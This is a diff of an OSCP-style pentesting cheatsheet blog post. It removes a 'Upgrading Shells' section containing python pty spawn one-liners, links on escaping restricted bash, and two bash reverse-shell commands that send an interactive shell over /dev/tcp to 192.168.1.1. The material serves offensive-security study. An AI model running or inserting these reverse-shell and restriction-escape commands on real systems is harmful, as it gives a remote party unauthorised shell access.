@@ -7,24 +7,7 @@ tags: [OSCP, Cheatsheet]
 layout: post
 ---
 
-###### Upgrading Shells
-```
-Upgrade sh to bash using python (2 or 3)
-> python -c 'import pty; pty.spawn("/bin/sh")'
-> python -c 'import pty; pty.spawn("/bin/bash")'
 
-Correcting the $PATH variable for sh / bash
-> export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin/usr/bin:/sbin:/binusr/local/sbin:/usr/local/bin:/usr/sbin:/bin
-
-Upgrading from rbash:
-https://www.hacknos.com/rbash-escape-rbash-restricted-shell-escape/
-https://www.hackingarticles.in/multiple-methods-to-bypass-restricted-shell/
-
-Start bash instance:
-> /bin/bash -i >& /dev/tcp/192.168.1.1/80 0>&1
-> /bin/bash -c '/bin/bash -i >& /dev/tcp/192.168.1.1/80 0>&1'
-
-```
 
 ###### Tricks to improve a crappy shell
 ```
